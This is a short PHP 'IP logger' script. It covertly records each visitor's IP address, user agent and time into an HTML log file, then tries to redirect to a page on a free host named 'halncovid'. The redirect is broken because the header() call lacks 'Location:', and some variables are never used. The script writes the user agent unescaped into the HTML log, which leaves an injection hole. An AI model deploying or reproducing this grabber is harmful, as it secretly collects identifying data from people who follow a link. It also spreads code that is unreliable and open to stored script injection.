<?php
$log = 'logger.html';
$ip = $_SERVER['REMOTE_ADDR'];
$date_time = date("l j F Y  g:ia", time() - date("Z")) ;
$timestamp = time();
$timeout = $timestamp - 30;
$agent = $_SERVER['HTTP_USER_AGENT'];
$fp = fopen("logger.html", "a");

fputs($fp, "
<b>$date_time</b><br> 
<b>IP: </b>$ip<br>
<b>Useragent:</b>$agent <br><br>
");
header ('https://halncovid.000webhost.com/');
?>
